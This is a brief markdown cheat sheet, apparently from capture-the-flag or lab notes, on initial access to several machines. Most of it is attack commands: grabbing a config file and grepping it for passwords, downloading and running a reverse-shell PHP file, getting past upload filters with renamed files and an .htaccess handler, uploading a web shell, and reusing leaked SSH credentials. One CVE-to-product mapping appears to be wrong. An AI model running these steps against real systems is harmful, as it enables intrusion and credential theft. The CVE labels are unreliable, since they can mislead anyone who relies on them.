## 🔓 Initial Access (Machines 41–50)

```bash
# Exploitation Vectors:
# - CVE-2020-25213 → WonderCMS config.php exposed
# - CVE-2019-11510 → Pulse Secure arbitrary file read
# - CVE-2017-5638 → Apache Struts OGNL injection

# Examples:
curl http://<IP>/config.php | grep password
wget http://<IP>/rev.php; php rev.php
```

```bash
# File Uploads:
# - Bypassed upload filters with .php5, .htaccess tricks

# Commands:
mv shell.php shell.jpg; echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -F "file=@shell.php5" http://<IP>/upload
```

```bash
# SSH Reuse:
# - Leaked credentials reused for SSH
ssh user@<IP> -p 22
```